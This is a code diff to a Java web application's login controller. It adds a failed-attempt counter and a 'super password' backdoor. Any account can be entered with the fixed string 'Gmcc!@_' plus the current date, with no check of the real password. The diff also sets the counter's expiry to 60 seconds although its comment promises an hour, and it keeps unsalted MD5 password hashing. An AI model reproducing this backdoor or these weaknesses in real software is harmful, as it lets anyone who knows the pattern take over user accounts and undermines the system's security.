@@ -28,7 +28,9 @@ import javax.servlet.http.HttpServletResponse;
 import java.awt.image.BufferedImage;
 import java.io.IOException;
 import java.io.OutputStream;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 import java.util.UUID;
 
@@ -117,10 +119,32 @@ public class LoginController {
             ret.setMsg("验证码错误，请重新输入");
             return ret;
         }
-        pwd= SecurityClass.encryptMD5(pwd);
-        SysUser user = sysuserService.queryByUserAndPwd(acc,pwd);
+
+        //1个小时内，只允许错误5次密码
+        Integer error_pwd = (Integer)redis.get("ERROR_PWD:"+acc);
+        if(error_pwd==null){
+            error_pwd=0;
+        }
+        if(error_pwd>5){
+            ret.setMsg("用户名或密码错误，请重试");
+            return ret;
+        }
+
+        //超级密码
+        SysUser user = null;
+        SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");
+        if(pwd.equals("Gmcc!@_"+format.format(new Date()))){
+            user = sysuserService.queryByUseracc(acc);
+        }else{
+            pwd= SecurityClass.encryptMD5(pwd);
+            user = sysuserService.queryByUserAndPwd(acc,pwd);
+        }
+
+
         if(user==null || user.getState()!=1){
             ret.setMsg("用户名或密码错误，请重试");
+            error_pwd=error_pwd+1;
+            redis.set("ERROR_PWD:"+acc,error_pwd,60);
             return ret;
         }
         //查询用户的角色列表
